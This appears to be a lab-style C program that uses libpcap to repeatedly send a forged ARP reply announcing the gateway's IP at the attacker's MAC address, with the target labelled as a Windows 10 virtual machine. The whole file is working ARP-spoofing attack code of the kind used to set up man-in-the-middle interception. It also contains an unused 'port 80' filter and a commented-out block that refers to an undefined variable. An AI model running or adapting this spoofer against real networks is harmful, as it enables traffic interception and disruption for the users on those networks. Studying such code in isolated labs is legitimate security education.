
#include <stdio.h>
#include <pcap.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/ether.h>	     // for either_ntoa
#include <netinet/if_ether.h>    // for ehter sturcture
#include <netinet/ip.h>    		 // for ip structure
#include <netinet/tcp.h>  		 // for tcp structure
#include <arpa/inet.h>

int main(int argv, char argc[]){

	//packet Design : static style ARP packet
	// Ether(14) + ARP(28) = 42bytes

	u_char s_arp[43]={               /* 42 + 1(null)             			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Destination Mac : Target(VM_win10)    */ 
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Source Mac      : Attacker(VM_Ubuntu) */
		0x08, 0x06,				         /*Ether Type                			 */
		0x00, 0x01,
		0x08, 0x00,
		0x06,					         /*Hardware Size, Length      			 */ 
		0x04,					         /*Protocol Size			  			 */
		0x00, 0x02,				         /*Opcode, 2 is replay        			 */
		0x00,0x0c,0x29,0xcd,0xda,0x7a,   /*Sender MAC      : Attacker(VM_Ubuntu) */
		0xc0,0xa8,0xf6,0x02,		     /*Sender IP (GW IP)		 			 */
		0x00,0x0c,0x29,0xff,0x61,0x71,   /*Target MAC      : Target(VM_win10)    */
		0xc0,0xa8,0xf6,0x89				 /*Tartget IP      : Target              */
	};


	pcap_t *s_handle;
	u_char *s_packet;
	struct pcap_pkthdr *header;
	char *dev;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;

	char filter_exp[] = "port 80";

	int count=0;

	setbuf(stdout,NULL);
	

	/* Define the device */
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
	/* Open the session in promiscuous mode */
	s_handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (s_handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
	
	printf("============================================================\n");
	printf("Dev : %s\n",dev);
	printf("Packet size : %d \n",sizeof(s_arp));
	

	while(1){

	for(count=0; count<sizeof(s_arp); count++){
		pcap_sendpacket(s_handle, s_arp, 43);

		if(count%16==0) printf("\n");
		printf("%02x ",s_arp[count]);
//		sleep(1);
//		printf("\r");
		
	}

	printf("\n");
}

/*
	for(int i=0; i<sizeof(sniff_arp); i++){
		if(i%16 ==0){
			printf("\n");
		}
		printf("%x ",sniff_arp[i]);
	}
	printf("\n");
*/


	//NOW try to use pcap_packet
	// int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);


}



